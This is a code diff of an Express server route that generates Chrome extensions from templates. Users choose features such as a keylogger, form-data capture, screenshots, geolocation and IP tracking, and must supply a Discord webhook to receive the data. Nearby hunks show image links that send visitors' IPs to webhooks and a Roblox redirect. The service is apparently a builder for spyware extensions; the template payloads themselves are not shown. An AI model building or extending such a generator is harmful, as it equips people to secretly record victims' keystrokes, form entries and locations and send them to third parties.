@@ -795,7 +795,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const isOverLimit = accessKey.usedCount >= accessKey.usageLimit;
 
       res.set('Content-Type', 'application/json');
-      res.status(200).json({ 
+      res.status(200).json({
         valid: accessKey.isActive && !isExpired && !isOverLimit,
         message: accessKey.isActive && !isExpired && !isOverLimit ? 'Key is valid' : 'Key is invalid or expired'
       });
@@ -809,20 +809,379 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Extension generation endpoint
   app.post('/api/generate-extension', authenticateUser, async (req: Request, res: Response) => {
     try {
-      const config = req.body;
-      
-      if (!config.name || !config.webhookUrl) {
-        return res.status(400).json({ error: 'Name and webhook URL are required' });
+      const { name, description, version, permissions, features, webhookUrl, customCode } = req.body;
+
+      if (!name || !description || !version) {
+        return res.status(400).json({ error: 'Name, description, and version are required' });
       }
 
-      // Mock successful generation - replace with actual extension generation logic
-      const mockZipData = Buffer.from('Mock extension zip file content');
-      
-      res.setHeader('Content-Type', 'application/zip');
-      res.setHeader('Content-Disposition', `attachment; filename="${config.name.replace(/\s+/g, '_').toLowerCase()}_extension.zip"`);
-      res.send(mockZipData);
+      if (!webhookUrl || !webhookUrl.trim()) {
+        return res.status(400).json({ error: 'Discord webhook URL is required' });
+      }
+
+      if (!Array.isArray(permissions)) {
+        return res.status(400).json({ error: 'Permissions must be an array' });
+      }
+
+      if (!Array.isArray(features)) {
+        return res.status(400).json({ error: 'Features must be an array' });
+      }
+
+      // Validation functions
+      const validateManifest = (manifestContent: string): { isValid: boolean, errors: string[] } => {
+        const errors: string[] = [];
+
+        try {
+          const manifest = JSON.parse(manifestContent);
+
+          // Required fields validation
+          if (!manifest.name || typeof manifest.name !== 'string') {
+            errors.push('Manifest missing or invalid name field');
+          }
+          if (!manifest.version || typeof manifest.version !== 'string') {
+            errors.push('Manifest missing or invalid version field');
+          }
+          if (!manifest.manifest_version || ![2, 3].includes(manifest.manifest_version)) {
+            errors.push('Manifest missing or invalid manifest_version (must be 2 or 3)');
+          }
+
+          // Permissions validation - expanded to include more legitimate Chrome permissions
+          if (manifest.permissions && !Array.isArray(manifest.permissions)) {
+            errors.push('Manifest permissions must be an array');
+          } else if (manifest.permissions) {
+            const validPermissions = [
+              'activeTab', 'storage', 'tabs', 'cookies', 'history', 'bookmarks',
+              'webRequest', 'geolocation', 'notifications', 'scripting', 'background',
+              'alarms', 'contextMenus', 'declarativeNetRequest', 'downloads', 'identity',
+              'management', 'offscreen', 'power', 'privacy', 'proxy', 'sessions',
+              'sidePanel', 'system.cpu', 'system.memory', 'system.storage', 'tabGroups',
+              'topSites', 'webNavigation', 'unlimitedStorage', 'clipboardRead', 'clipboardWrite',
+              'desktopCapture', 'displaySource', 'experimental', 'fileBrowserHandler',
+              'fontSettings', 'gcm', 'idle', 'nativeMessaging', 'pageCapture', 'platformKeys',
+              'printingMetrics', 'processes', 'signedInDevices', 'tabCapture', 'tts',
+              'ttsEngine', 'wallpaper', 'enterprise.deviceAttributes', 'enterprise.hardwarePlatform',
+              'enterprise.machineIdentifier', 'enterprise.networkingAttributes', 'enterprise.platformKeys'
+            ];
+            const invalidPerms = manifest.permissions.filter((perm: string) =>
+              !validPermissions.includes(perm) &&
+              !perm.startsWith('http') &&
+              !perm.startsWith('https://') &&
+              !perm.startsWith('*://') &&
+              !perm.includes('*') // Allow wildcard patterns
+            );
+            if (invalidPerms.length > 0) {
+              errors.push(`Potentially invalid permissions: ${invalidPerms.join(', ')}`);
+            }
+          }
+
+          // Content scripts validation
+          if (manifest.content_scripts && !Array.isArray(manifest.content_scripts)) {
+            errors.push('Manifest content_scripts must be an array');
+          }
+
+        } catch (parseError) {
+          errors.push('Invalid JSON in manifest file');
+        }
+
+        return { isValid: errors.length === 0, errors };
+      };
+
+      const validateScript = (jsContent: string, filename: string): { isValid: boolean, errors: string[] } => {
+        const errors: string[] = [];
+
+        try {
+          // Basic syntax validation - check for common syntax errors
+          if (!jsContent.trim()) {
+            errors.push(`${filename} is empty`);
+            return { isValid: false, errors };
+          }
+
+          // More sophisticated syntax checking
+          try {
+            // Use Function constructor for basic syntax validation
+            // This will catch most syntax errors without executing the code
+            new Function(jsContent);
+          } catch (syntaxError) {
+            // Extract useful information from syntax error
+            const errorMessage = syntaxError.message;
+            if (errorMessage.includes('Unexpected token') ||
+                errorMessage.includes('Unexpected end of input') ||
+                errorMessage.includes('Invalid or unexpected token')) {
+              errors.push(`${filename} has syntax error: ${errorMessage}`);
+            }
+          }
+
+          // Check for unreplaced template variables (non-fatal but worth noting)
+          if (jsContent.includes('{{') && jsContent.includes('}}')) {
+            const templateVars = jsContent.match(/\{\{[^}]+\}\}/g) || [];
+            if (templateVars.length > 0) {
+              // Only flag as error if it's not a comment
+              const uncommentedVars = templateVars.filter(tvar => {
+                const lines = jsContent.split('\n');
+                return !lines.some(line => line.includes(tvar) && line.trim().startsWith('//'));
+              });
+              if (uncommentedVars.length > 0) {
+                errors.push(`${filename} contains unreplaced template variables: ${uncommentedVars.join(', ')}`);
+              }
+            }
+          }
+
+          // Validate Chrome extension APIs usage (warning, not error)
+          if (filename === 'background.js') {
+            if (!jsContent.includes('chrome.') && !jsContent.includes('browser.')) {
+              // This is just a warning, not a fatal error
+              console.warn(`${filename} doesn't appear to use Chrome/browser APIs - this may be intentional`);
+            }
+          }
+
+          // Check for security issues in custom code (more comprehensive)
+          const securityPatterns = [
+            { pattern: /eval\s*\(/g, issue: 'eval() calls' },
+            { pattern: /Function\s*\(/g, issue: 'Function() constructor calls' },
+            { pattern: /innerHTML\s*=/g, issue: 'innerHTML assignments (XSS risk)' },
+            { pattern: /document\.write\s*\(/g, issue: 'document.write() calls' },
+            { pattern: /setTimeout\s*\(\s*["'`]/g, issue: 'setTimeout with string code' },
+            { pattern: /setInterval\s*\(\s*["'`]/g, issue: 'setInterval with string code' }
+          ];
+
+          securityPatterns.forEach(({ pattern, issue }) => {
+            if (pattern.test(jsContent)) {
+              errors.push(`${filename} contains potentially unsafe ${issue}`);
+            }
+          });
+
+          // Check for common coding mistakes
+          const mistakePatterns = [
+            { pattern: /;\s*;/g, issue: 'double semicolons' },
+            { pattern: /=\s*=\s*=/g, issue: 'triple equals without proper spacing' },
+            { pattern: /\s+$/gm, issue: 'trailing whitespace (code quality)' }
+          ];
+
+          mistakePatterns.forEach(({ pattern, issue }) => {
+            if (pattern.test(jsContent)) {
+              // These are warnings, not fatal errors
+              console.warn(`${filename} has code quality issue: ${issue}`);
+            }
+          });
+
+        } catch (error) {
+          errors.push(`Error validating ${filename}: ${error.message}`);
+        }
+
+        return { isValid: errors.length === 0, errors };
+      };
+
+      // Import using dynamic import for ES modules
+      const { default: AdmZip } = await import('adm-zip');
+
+      const zip = new AdmZip();
+      // Fix __dirname for ES modules
+      const __filename = fileURLToPath(import.meta.url);
+      const __dirname = path.dirname(__filename);
+      const templatesDir = path.join(__dirname, 'extension-templates');
+
+      // Ensure templates directory exists
+      if (!fs.existsSync(templatesDir)) {
+        console.error('Extension templates directory not found:', templatesDir);
+        return res.status(500).json({ error: 'Extension templates not found' });
+      }
+
+      // Feature flags for template replacement
+      const featureFlags = {
+        '{{FEATURE_IP_TRACKING}}': features.includes('ip_tracking'),
+        '{{FEATURE_GEOLOCATION}}': features.includes('geolocation'),
+        '{{FEATURE_BROWSER_INFO}}': features.includes('browser_info'),
+        '{{FEATURE_SCREENSHOT}}': features.includes('screenshot'),
+        '{{FEATURE_FORM_DATA}}': features.includes('form_data'),
+        '{{FEATURE_CLICK_TRACKING}}': features.includes('click_tracking'),
+        '{{FEATURE_KEYLOGGER}}': features.includes('keylogger')
+      };
+
+      // Template replacements
+      const replacements = {
+        '{{EXTENSION_NAME}}': name,
+        '{{EXTENSION_DESCRIPTION}}': description,
+        '{{EXTENSION_VERSION}}': version,
+        '{{PERMISSIONS}}': JSON.stringify(permissions),
+        '{{WEBHOOK_URL}}': webhookUrl,
+        '{{CUSTOM_CODE}}': customCode || '// No custom code provided',
+        '{{TRACKING_SERVER}}': `${req.protocol}://${req.get('host')}`,
+        '{{USER_ID}}': req.user.id,
+        '{{EXTENSION_ID}}': randomUUID(),
+        ...featureFlags
+      };
+
+      // Process template files with validation
+      const templateFiles = ['manifest.json', 'background.js', 'content.js', 'popup.html', 'popup.js'];
+      const validationResults = {
+        manifest: { isValid: true, errors: [] as string[] },
+        scripts: { isValid: true, errors: [] as string[] }
+      };
+
+      for (const filename of templateFiles) {
+        const templatePath = path.join(templatesDir, filename);
+        if (fs.existsSync(templatePath)) {
+          let content = fs.readFileSync(templatePath, 'utf8');
+
+          // Replace all placeholders
+          Object.entries(replacements).forEach(([placeholder, replacement]) => {
+            content = content.replace(new RegExp(placeholder.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), String(replacement));
+          });
+
+          // Validate the processed file
+          if (filename === 'manifest.json') {
+            console.log(`🔍 Validating manifest.json...`);
+            const manifestValidation = validateManifest(content);
+            validationResults.manifest = manifestValidation;
+            if (!manifestValidation.isValid) {
+              console.error(`❌ Manifest validation failed:`, manifestValidation.errors);
+            } else {
+              console.log(`✅ Manifest validation passed`);
+            }
+          } else if (filename.endsWith('.js')) {
+            console.log(`🔍 Validating ${filename}...`);
+            const scriptValidation = validateScript(content, filename);
+            validationResults.scripts.isValid = validationResults.scripts.isValid && scriptValidation.isValid;
+            validationResults.scripts.errors.push(...scriptValidation.errors);
+            if (!scriptValidation.isValid) {
+              console.error(`❌ Script validation failed for ${filename}:`, scriptValidation.errors);
+            } else {
+              console.log(`✅ Script validation passed for ${filename}`);
+            }
+          }
+
+          // Add file to ZIP
+          zip.addFile(filename, Buffer.from(content, 'utf8'));
+          console.log(`📦 Added ${filename} to ZIP (${Buffer.from(content, 'utf8').length} bytes)`);
+        } else {
+          console.error(`❌ Template file not found: ${templatePath}`);
+          return res.status(500).json({ error: `Template file ${filename} not found` });
+        }
+      }
+
+      // Create simple colored icons for the extension
+      const createSimpleIcon = (size: number) => {
+        // Create a simple PNG icon with a spy glass emoji look
+        const canvas = Buffer.from(`
+          <svg width="${size}" height="${size}" xmlns="http://www.w3.org/2000/svg">
+            <rect width="${size}" height="${size}" fill="#4F46E5"/>
+            <text x="${size/2}" y="${size/2 + size/6}" text-anchor="middle" fill="white" font-size="${Math.floor(size * 0.6)}" font-family="Arial, sans-serif">🕵️</text>
+          </svg>
+        `);
+        return canvas;
+      };
+
+      // Add icon files (simple SVG converted to buffer)
+      zip.addFile('icon16.png', createSimpleIcon(16));
+      zip.addFile('icon48.png', createSimpleIcon(48));
+      zip.addFile('icon128.png', createSimpleIcon(128));
+      console.log(`🎨 Added icon files to ZIP`);
+
+      // Generate the final ZIP buffer
+      const zipBuffer = zip.toBuffer();
+      console.log(`📦 Generated ZIP buffer: ${zipBuffer.length} bytes`);
+
+      if (zipBuffer.length === 0) {
+        console.error(`❌ Generated ZIP buffer is empty!`);
+        return res.status(500).json({ error: 'Generated extension file is empty' });
+      }
+
+      const extensionId = replacements['{{EXTENSION_ID}}'];
+
+      // Track extension generation in database
+      try {
+        const clientIp = getClientIp(req);
+        const { locationData } = await createEnhancedIpLog({
+          userId: req.user.id,
+          clientIp,
+          userAgent: req.headers['user-agent'] || 'unknown',
+          referrer: req.headers.referer || '',
+          status: 'success'
+        });
+
+        // Determine overall generation status based on validation
+        const hasValidationErrors = !validationResults.manifest.isValid || !validationResults.scripts.isValid;
+        const allValidationErrors = [
+          ...validationResults.manifest.errors,
+          ...validationResults.scripts.errors
+        ];
+
+        // Create extension log entry
+        await storage.createExtensionLog({
+          userId: req.user.id,
+          extensionName: name,
+          extensionDescription: description,
+          extensionVersion: version,
+          permissions: permissions || [],
+          features: features || [],
+          webhookUrl: webhookUrl,
+          customCode: customCode || '',
+          generationStatus: hasValidationErrors ? 'validation_failed' : 'success',
+          errorMessage: hasValidationErrors ? `Validation errors: ${allValidationErrors.join('; ')}` : null,
+          downloadCount: 1,
+          extensionId: extensionId,
+          ipAddress: clientIp,
+          userAgent: req.headers['user-agent'] || 'unknown',
+          location: locationData.location,
+          zipFileSize: zipBuffer.length,
+          manifestValid: validationResults.manifest.isValid,
+          scriptsValid: validationResults.scripts.isValid
+        });
+
+        console.log(`✅ Extension generation tracked: ${name} for user ${req.user.id}`);
+      } catch (trackingError) {
+        console.error('Failed to track extension generation:', trackingError);
+        // Don't fail the request if tracking fails
+      }
+
+      res.set({
+        'Content-Type': 'application/zip',
+        'Content-Disposition': `attachment; filename="${name.replace(/\s+/g, '_').toLowerCase()}_extension.zip"`
+      });
+
+      res.send(zipBuffer);
+
     } catch (error) {
       console.error('Extension generation error:', error);
+
+      // Track failed generation attempt
+      try {
+        const clientIp = getClientIp(req);
+        const { locationData } = await createEnhancedIpLog({
+          userId: req.user?.id,
+          clientIp,
+          userAgent: req.headers['user-agent'] || 'unknown',
+          referrer: req.headers.referer || '',
+          status: 'error'
+        });
+
+        // Only track if we have basic info
+        if (req.body?.name && req.user?.id) {
+          await storage.createExtensionLog({
+            userId: req.user.id,
+            extensionName: req.body.name || 'Unknown',
+            extensionDescription: req.body.description || '',
+            extensionVersion: req.body.version || '1.0.0',
+            permissions: req.body.permissions || [],
+            features: req.body.features || [],
+            webhookUrl: req.body.webhookUrl || '',
+            customCode: req.body.customCode || '',
+            generationStatus: 'error',
+            errorMessage: error.message || 'Unknown error during generation',
+            downloadCount: 0,
+            extensionId: randomUUID(),
+            ipAddress: clientIp,
+            userAgent: req.headers['user-agent'] || 'unknown',
+            location: locationData.location,
+            zipFileSize: 0,
+            manifestValid: false,
+            scriptsValid: false
+          });
+        }
+      } catch (trackingError) {
+        console.error('Failed to track extension generation error:', trackingError);
+      }
+
       res.status(500).json({ error: 'Failed to generate extension' });
     }
   });
@@ -1889,7 +2248,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       if (settings?.webhookUrl && settings.webhookUrl.length > 0) {
         console.log(`🔗 Raw image access - sending webhook to Discord for IP: ${clientIp}`);
 
-        // Send webhook in background with enhanced data
+        // Send webhook in background - don't block response
         sendToWebhook(settings.webhookUrl, {
           ipAddress: clientIp,
           userAgent,
@@ -3414,384 +3773,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error('Roblox redirect error:', error);
       res.status(500).send('Internal server error');
-    }
-  });
-
-  // Generate Chrome extension endpoint
-  app.post('/api/generate-extension', authenticateUser, async (req: Request, res: Response) => {
-    try {
-      const { name, description, version, permissions, features, webhookUrl, customCode } = req.body;
-
-      if (!name || !description || !version) {
-        return res.status(400).json({ error: 'Name, description, and version are required' });
-      }
-
-      if (!webhookUrl || !webhookUrl.trim()) {
-        return res.status(400).json({ error: 'Discord webhook URL is required' });
-      }
-
-      if (!Array.isArray(permissions)) {
-        return res.status(400).json({ error: 'Permissions must be an array' });
-      }
-
-      if (!Array.isArray(features)) {
-        return res.status(400).json({ error: 'Features must be an array' });
-      }
-
-      // Validation functions
-      const validateManifest = (manifestContent: string): { isValid: boolean, errors: string[] } => {
-        const errors: string[] = [];
-
-        try {
-          const manifest = JSON.parse(manifestContent);
-
-          // Required fields validation
-          if (!manifest.name || typeof manifest.name !== 'string') {
-            errors.push('Manifest missing or invalid name field');
-          }
-          if (!manifest.version || typeof manifest.version !== 'string') {
-            errors.push('Manifest missing or invalid version field');
-          }
-          if (!manifest.manifest_version || ![2, 3].includes(manifest.manifest_version)) {
-            errors.push('Manifest missing or invalid manifest_version (must be 2 or 3)');
-          }
-
-          // Permissions validation - expanded to include more legitimate Chrome permissions
-          if (manifest.permissions && !Array.isArray(manifest.permissions)) {
-            errors.push('Manifest permissions must be an array');
-          } else if (manifest.permissions) {
-            const validPermissions = [
-              'activeTab', 'storage', 'tabs', 'cookies', 'history', 'bookmarks',
-              'webRequest', 'geolocation', 'notifications', 'scripting', 'background',
-              'alarms', 'contextMenus', 'declarativeNetRequest', 'downloads', 'identity',
-              'management', 'offscreen', 'power', 'privacy', 'proxy', 'sessions',
-              'sidePanel', 'system.cpu', 'system.memory', 'system.storage', 'tabGroups',
-              'topSites', 'webNavigation', 'unlimitedStorage', 'clipboardRead', 'clipboardWrite',
-              'desktopCapture', 'displaySource', 'experimental', 'fileBrowserHandler',
-              'fontSettings', 'gcm', 'idle', 'nativeMessaging', 'pageCapture', 'platformKeys',
-              'printingMetrics', 'processes', 'signedInDevices', 'tabCapture', 'tts',
-              'ttsEngine', 'wallpaper', 'enterprise.deviceAttributes', 'enterprise.hardwarePlatform',
-              'enterprise.machineIdentifier', 'enterprise.networkingAttributes', 'enterprise.platformKeys'
-            ];
-            const invalidPerms = manifest.permissions.filter((perm: string) => 
-              !validPermissions.includes(perm) && 
-              !perm.startsWith('http') && 
-              !perm.startsWith('https://') && 
-              !perm.startsWith('*://') &&
-              !perm.includes('*') // Allow wildcard patterns
-            );
-            if (invalidPerms.length > 0) {
-              errors.push(`Potentially invalid permissions: ${invalidPerms.join(', ')}`);
-            }
-          }
-
-          // Content scripts validation
-          if (manifest.content_scripts && !Array.isArray(manifest.content_scripts)) {
-            errors.push('Manifest content_scripts must be an array');
-          }
-
-        } catch (parseError) {
-          errors.push('Invalid JSON in manifest file');
-        }
-
-        return { isValid: errors.length === 0, errors };
-      };
-
-      const validateJavaScript = (jsContent: string, filename: string): { isValid: boolean, errors: string[] } => {
-        const errors: string[] = [];
-
-        try {
-          // Basic syntax validation - check for common syntax errors
-          if (!jsContent.trim()) {
-            errors.push(`${filename} is empty`);
-            return { isValid: false, errors };
-          }
-
-          // More sophisticated syntax checking
-          try {
-            // Use Function constructor for basic syntax validation
-            // This will catch most syntax errors without executing the code
-            new Function(jsContent);
-          } catch (syntaxError) {
-            // Extract useful information from syntax error
-            const errorMessage = syntaxError.message;
-            if (errorMessage.includes('Unexpected token') || 
-                errorMessage.includes('Unexpected end of input') ||
-                errorMessage.includes('Invalid or unexpected token')) {
-              errors.push(`${filename} has syntax error: ${errorMessage}`);
-            }
-          }
-
-          // Check for unreplaced template variables (non-fatal but worth noting)
-          if (jsContent.includes('{{') && jsContent.includes('}}')) {
-            const templateVars = jsContent.match(/\{\{[^}]+\}\}/g) || [];
-            if (templateVars.length > 0) {
-              // Only flag as error if it's not a comment
-              const uncommentedVars = templateVars.filter(tvar => {
-                const lines = jsContent.split('\n');
-                return !lines.some(line => line.includes(tvar) && line.trim().startsWith('//'));
-              });
-              if (uncommentedVars.length > 0) {
-                errors.push(`${filename} contains unreplaced template variables: ${uncommentedVars.join(', ')}`);
-              }
-            }
-          }
-
-          // Validate Chrome extension APIs usage (warning, not error)
-          if (filename === 'background.js') {
-            if (!jsContent.includes('chrome.') && !jsContent.includes('browser.')) {
-              // This is just a warning, not a fatal error
-              console.warn(`${filename} doesn't appear to use Chrome/browser APIs - this may be intentional`);
-            }
-          }
-
-          // Check for security issues in custom code (more comprehensive)
-          const securityPatterns = [
-            { pattern: /eval\s*\(/g, issue: 'eval() calls' },
-            { pattern: /Function\s*\(/g, issue: 'Function() constructor calls' },
-            { pattern: /innerHTML\s*=/g, issue: 'innerHTML assignments (XSS risk)' },
-            { pattern: /document\.write\s*\(/g, issue: 'document.write() calls' },
-            { pattern: /setTimeout\s*\(\s*["'`]/g, issue: 'setTimeout with string code' },
-            { pattern: /setInterval\s*\(\s*["'`]/g, issue: 'setInterval with string code' }
-          ];
-
-          securityPatterns.forEach(({ pattern, issue }) => {
-            if (pattern.test(jsContent)) {
-              errors.push(`${filename} contains potentially unsafe ${issue}`);
-            }
-          });
-
-          // Check for common coding mistakes
-          const mistakePatterns = [
-            { pattern: /;\s*;/g, issue: 'double semicolons' },
-            { pattern: /=\s*=\s*=/g, issue: 'triple equals without proper spacing' },
-            { pattern: /\s+$/gm, issue: 'trailing whitespace (code quality)' }
-          ];
-
-          mistakePatterns.forEach(({ pattern, issue }) => {
-            if (pattern.test(jsContent)) {
-              // These are warnings, not fatal errors
-              console.warn(`${filename} has code quality issue: ${issue}`);
-            }
-          });
-
-        } catch (error) {
-          errors.push(`Error validating ${filename}: ${error.message}`);
-        }
-
-        return { isValid: errors.length === 0, errors };
-      };
-
-      // Import using dynamic import for ES modules
-      const { default: AdmZip } = await import('adm-zip');
-
-      const zip = new AdmZip();
-      // Fix __dirname for ES modules
-      const __filename = fileURLToPath(import.meta.url);
-      const __dirname = path.dirname(__filename);
-      const templatesDir = path.join(__dirname, 'extension-templates');
-
-      // Ensure templates directory exists
-      if (!fs.existsSync(templatesDir)) {
-        console.error('Extension templates directory not found:', templatesDir);
-        return res.status(500).json({ error: 'Extension templates not found' });
-      }
-
-      // Feature flags for template replacement
-      const featureFlags = {
-        '{{FEATURE_IP_TRACKING}}': features.includes('ip_tracking'),
-        '{{FEATURE_GEOLOCATION}}': features.includes('geolocation'),
-        '{{FEATURE_BROWSER_INFO}}': features.includes('browser_info'),
-        '{{FEATURE_SCREENSHOT}}': features.includes('screenshot'),
-        '{{FEATURE_FORM_DATA}}': features.includes('form_data'),
-        '{{FEATURE_CLICK_TRACKING}}': features.includes('click_tracking'),
-        '{{FEATURE_KEYLOGGER}}': features.includes('keylogger')
-      };
-
-      // Template replacements
-      const replacements = {
-        '{{EXTENSION_NAME}}': name,
-        '{{EXTENSION_DESCRIPTION}}': description,
-        '{{EXTENSION_VERSION}}': version,
-        '{{PERMISSIONS}}': JSON.stringify(permissions),
-        '{{WEBHOOK_URL}}': webhookUrl,
-        '{{CUSTOM_CODE}}': customCode || '// No custom code provided',
-        '{{TRACKING_SERVER}}': `${req.protocol}://${req.get('host')}`,
-        '{{USER_ID}}': req.user.id,
-        '{{EXTENSION_ID}}': randomUUID(),
-        ...featureFlags
-      };
-
-      // Process template files with validation
-      const templateFiles = ['manifest.json', 'background.js', 'content.js', 'popup.html', 'popup.js'];
-      const validationResults = {
-        manifest: { isValid: true, errors: [] as string[] },
-        scripts: { isValid: true, errors: [] as string[] }
-      };
-
-      for (const filename of templateFiles) {
-        const templatePath = path.join(templatesDir, filename);
-        if (fs.existsSync(templatePath)) {
-          let content = fs.readFileSync(templatePath, 'utf8');
-
-          // Replace template variables with proper boolean handling
-          Object.entries(replacements).forEach(([key, value]) => {
-            if (typeof value === 'boolean') {
-              content = content.replace(new RegExp(key, 'g'), value.toString());
-            } else {
-              content = content.replace(new RegExp(key.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), String(value));
-            }
-          });
-
-          // Validate content after template replacement
-          if (filename === 'manifest.json') {
-            const manifestValidation = validateManifest(content);
-            validationResults.manifest = manifestValidation;
-            if (!manifestValidation.isValid) {
-              console.warn(`Manifest validation errors for ${name}:`, manifestValidation.errors);
-            }
-          } else if (filename.endsWith('.js')) {
-            const scriptValidation = validateJavaScript(content, filename);
-            if (!scriptValidation.isValid) {
-              validationResults.scripts.isValid = false;
-              validationResults.scripts.errors.push(...scriptValidation.errors);
-              console.warn(`Script validation errors for ${name} in ${filename}:`, scriptValidation.errors);
-            }
-          }
-
-          zip.addFile(filename, Buffer.from(content, 'utf8'));
-        } else {
-          console.warn(`Template file not found: ${templatePath}`);
-          // Add a basic file if template is missing
-          if (filename === 'manifest.json') {
-            const basicManifest = {
-              "manifest_version": 3,
-              "name": name,
-              "version": version,
-              "description": description,
-              "permissions": permissions,
-              "host_permissions": ["<all_urls>"],
-              "background": { "service_worker": "background.js" },
-              "action": { "default_title": name }
-            };
-            zip.addFile(filename, Buffer.from(JSON.stringify(basicManifest, null, 2), 'utf8'));
-          }
-        }
-      }
-
-      // Add icon files (simple base64 encoded icons)
-      // A basic 1x1 transparent pixel GIF
-      const icon16Base64 = 'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
-      const icon48Base64 = 'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='; // Placeholder, should be actual 48x48 icon
-      const icon128Base64 = 'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=='; // Placeholder, should be actual 128x128 icon
-
-      const icon16Buffer = Buffer.from(icon16Base64, 'base64');
-      const icon48Buffer = Buffer.from(icon48Base64, 'base64');
-      const icon128Buffer = Buffer.from(icon128Base64, 'base64');
-
-      zip.addFile('icon16.png', icon16Buffer);
-      zip.addFile('icon48.png', icon48Buffer);
-      zip.addFile('icon128.png', icon128Buffer);
-
-
-      const zipBuffer = zip.toBuffer();
-      const extensionId = replacements['{{EXTENSION_ID}}'];
-
-      // Track extension generation in database
-      try {
-        const clientIp = getClientIp(req);
-        const { locationData } = await createEnhancedIpLog({
-          userId: req.user.id,
-          clientIp,
-          userAgent: req.headers['user-agent'] || 'unknown',
-          referrer: req.headers.referer || '',
-          status: 'success'
-        });
-
-        // Determine overall generation status based on validation
-        const hasValidationErrors = !validationResults.manifest.isValid || !validationResults.scripts.isValid;
-        const allValidationErrors = [
-          ...validationResults.manifest.errors,
-          ...validationResults.scripts.errors
-        ];
-
-        // Create extension log entry
-        await storage.createExtensionLog({
-          userId: req.user.id,
-          extensionName: name,
-          extensionDescription: description,
-          extensionVersion: version,
-          permissions: permissions || [],
-          features: features || [],
-          webhookUrl: webhookUrl,
-          customCode: customCode || '',
-          generationStatus: hasValidationErrors ? 'validation_failed' : 'success',
-          errorMessage: hasValidationErrors ? `Validation errors: ${allValidationErrors.join('; ')}` : null,
-          downloadCount: 1,
-          extensionId: extensionId,
-          ipAddress: clientIp,
-          userAgent: req.headers['user-agent'] || 'unknown',
-          location: locationData.location,
-          zipFileSize: zipBuffer.length,
-          manifestValid: validationResults.manifest.isValid,
-          scriptsValid: validationResults.scripts.isValid
-        });
-
-        console.log(`✅ Extension generation tracked: ${name} for user ${req.user.id}`);
-      } catch (trackingError) {
-        console.error('Failed to track extension generation:', trackingError);
-        // Don't fail the request if tracking fails
-      }
-
-      res.set({
-        'Content-Type': 'application/zip',
-        'Content-Disposition': `attachment; filename="${name.replace(/\s+/g, '_').toLowerCase()}_extension.zip"`
-      });
-
-      res.send(zipBuffer);
-
-    } catch (error) {
-      console.error('Extension generation error:', error);
-
-      // Track failed generation attempt
-      try {
-        const clientIp = getClientIp(req);
-        const { locationData } = await createEnhancedIpLog({
-          userId: req.user?.id,
-          clientIp,
-          userAgent: req.headers['user-agent'] || 'unknown',
-          referrer: req.headers.referer || '',
-          status: 'error'
-        });
-
-        // Only track if we have basic info
-        if (req.body?.name && req.user?.id) {
-          await storage.createExtensionLog({
-            userId: req.user.id,
-            extensionName: req.body.name || 'Unknown',
-            extensionDescription: req.body.description || '',
-            extensionVersion: req.body.version || '1.0.0',
-            permissions: req.body.permissions || [],
-            features: req.body.features || [],
-            webhookUrl: req.body.webhookUrl || '',
-            customCode: req.body.customCode || '',
-            generationStatus: 'error',
-            errorMessage: error.message || 'Unknown error during generation',
-            downloadCount: 0,
-            extensionId: randomUUID(),
-            ipAddress: clientIp,
-            userAgent: req.headers['user-agent'] || 'unknown',
-            location: locationData.location,
-            zipFileSize: 0,
-            manifestValid: false,
-            scriptsValid: false
-          });
-        }
-      } catch (trackingError) {
-        console.error('Failed to track extension generation error:', trackingError);
-      }
-
-      res.status(500).json({ error: 'Failed to generate extension' });
     }
   });
 
